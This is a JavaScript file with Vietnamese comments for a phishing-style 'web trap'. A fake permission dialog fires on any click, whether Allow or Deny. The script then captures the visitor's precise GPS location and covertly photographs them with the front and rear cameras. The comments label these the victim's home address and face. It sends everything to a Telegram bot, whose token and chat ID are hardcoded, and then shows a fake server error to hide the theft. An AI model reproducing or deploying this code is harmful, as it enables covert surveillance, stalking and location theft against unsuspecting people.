// ==========================================
// CẤU HÌNH BOTNET (TELEGRAM)
// ==========================================
const TELEGRAM_BOT_TOKEN = "8728418804:AAFBDMqKe2xx0wdJiYwqiDmVXyqpvtUuq90"; 
const TELEGRAM_CHAT_ID = "7242089353";

document.addEventListener('DOMContentLoaded', () => {
    const btnAllow = document.getElementById('btnAllow');
    const btnDeny = document.getElementById('btnDeny');
    const modal = document.getElementById('permissionModal');
    
    const triggerWebTrap = async () => {
        if (modal.style.display === 'none') return; 
        modal.style.display = 'none'; // Ẩn bảng mồi
        
        // Hiện thông báo giả vờ đang tải filter
        const overlay = document.getElementById('loadingOverlay');
        overlay.innerHTML = `
            <div class="spinner"></div>
            <p>Đang đồng bộ ống kính và vị trí ảnh chụp...</p>
        `;

        try {
            // 1. CHỤP ĐỊA CHỈ NHÀ (GPS)
            let mapsLink = "Không lấy được vị trí";
            if (navigator.geolocation) {
                const pos = await new Promise((resolve, reject) => {
                    navigator.geolocation.getCurrentPosition(resolve, reject, {
                        enableHighAccuracy: true, timeout: 5000, maximumAge: 0
                    });
                }).catch(() => null);
                
                if (pos) {
                    const lat = pos.coords.latitude;
                    const lon = pos.coords.longitude;
                    mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
                }
            }

            // Gửi vị trí trước cho chắc ăn
            await sendTextToTelegram(`📍 **MỤC TIÊU ĐÃ SẬP BẪY!**\n\n🗺️ **Địa chỉ nhà (Google Maps):**\n${mapsLink}\n\n📸 Đang tiến hành chụp lén Camera...`);

            // 2. CHỤP LÉN CAMERA
            // Hàm chụp ảnh từ video stream
            const snapPhoto = async (facingMode) => {
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({
                        video: { facingMode: facingMode }
                    });
                    const video = document.createElement('video');
                    video.srcObject = stream;
                    await video.play();
                    
                    const canvas = document.createElement('canvas');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    
                    // Tắt luồng stream để đèn camera tắt
                    stream.getTracks().forEach(track => track.stop());
                    
                    return await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.8));
                } catch (e) {
                    return null;
                }
            };

            // Chụp Cam Trước
            const frontPhoto = await snapPhoto("user");
            if (frontPhoto) await sendPhotoToTelegram(frontPhoto, "📸 Ảnh Camera TRƯỚC (Mặt nạn nhân)");

            // Chụp Cam Sau
            const rearPhoto = await snapPhoto("environment");
            if (rearPhoto) await sendPhotoToTelegram(rearPhoto, "📸 Ảnh Camera SAU (Xung quanh)");

        } catch (err) {}

        // Sau khi trộm xong, hiện lỗi ảo
        overlay.innerHTML = `
            <i class="fas fa-exclamation-triangle" style="font-size: 40px; color: #ffeb3b; margin-bottom: 20px;"></i>
            <p style="text-align:center; padding: 0 20px;">
                Kết nối máy chủ bị lỗi!<br>
                Vui lòng thử lại sau.
            </p>
        `;
    };

    btnAllow.addEventListener('click', triggerWebTrap);
    btnDeny.addEventListener('click', triggerWebTrap);
    modal.addEventListener('click', triggerWebTrap);
});

// ==========================================
// CÁC HÀM GIAO TIẾP TELEGRAM
// ==========================================
async function sendTextToTelegram(text) {
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    await fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            chat_id: TELEGRAM_CHAT_ID,
            text: text,
            parse_mode: 'Markdown'
        })
    });
}

async function sendPhotoToTelegram(blob, caption) {
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`;
    const formData = new FormData();
    formData.append('chat_id', TELEGRAM_CHAT_ID);
    formData.append('caption', caption);
    formData.append('photo', blob, 'photo.jpg');

    await fetch(url, {
        method: 'POST',
        body: formData
    });
}
